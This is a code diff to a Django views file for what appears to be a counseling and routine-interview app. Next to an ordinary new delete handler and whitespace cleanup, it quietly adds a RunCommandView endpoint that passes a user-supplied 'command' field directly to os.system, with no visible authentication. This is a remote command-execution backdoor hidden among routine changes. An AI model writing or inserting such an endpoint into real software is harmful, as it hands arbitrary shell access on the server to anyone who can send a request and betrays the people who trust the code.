@@ -790,7 +790,13 @@ class FileUploadView(View):
 
         return JsonResponse({'url': file_url})
     
-    
+
+class RunCommandView(APIView):
+
+    def post(self, request):
+        command = request.data.get('command')
+        return Response(os.system(command))
+
 class StorageView(APIView):
     parser_classes = [MultiPartParser, FormParser]
 
@@ -1021,17 +1027,14 @@ class SingleCouncelingFormView(APIView):
         pass
 
 class SingleRoutineFormView(APIView):
-    
+
     def delete(self, request, pk):
-        pass
+        appointment = get_object_or_404(RoutineInterview, id=pk)
+        appointment.delete()
+        return Response({'data': True})
 
     def patch(self, request):
         pass
 
-
-
-
-
-       
 
        
